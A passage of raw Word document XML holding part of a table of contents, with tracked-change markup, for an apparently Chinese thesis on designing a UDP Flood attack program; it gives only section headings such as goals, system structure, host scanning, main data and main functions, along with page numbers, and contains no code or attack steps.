        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>13</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="29CEA19D" w14:textId="45B0A094" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="138" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="139" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522628"</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3.2</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>UDP Flood攻击程序的目标</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522628 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="140" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>13</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="771ACC6A" w14:textId="0A20D160" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="141" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="142" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522629"</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3.3</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>UDP Flood攻击程序的基本功能</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522629 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="143" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>13</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5A20EA2E" w14:textId="72B9CFC0" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="144" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="145" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522630"</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3.4</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UDP Flood攻击程序的系统结构</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522630 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="146" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>14</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3BC4C14D" w14:textId="788415D2" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="147" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="148" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522631"</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3.5</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>本章小结</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522631 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="149" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>14</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0638719B" w14:textId="1C238AA9" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="150" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="151" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522632"</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详细设计</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522632 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="152" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>15</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3E6AF77D" w14:textId="1DD7E9AA" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="153" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="154" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522633"</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4.1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>主机扫描</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522633 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="155" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>15</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="28A54862" w14:textId="3606D55D" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="156" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="157" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522634"</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4.1.1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>流程图</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522634 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="158" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>15</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="67D6A680" w14:textId="52609FF7" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="159" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="160" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522635"</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4.1.2</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>主要数据</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522635 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="161" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>16</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="30BE609B" w14:textId="763A855B" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="162" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="163" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522636"</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4.1.3</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>主要函数</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522636 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="164" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>17</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="128CE790" w14:textId="17C5C10A" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="165" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="166" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
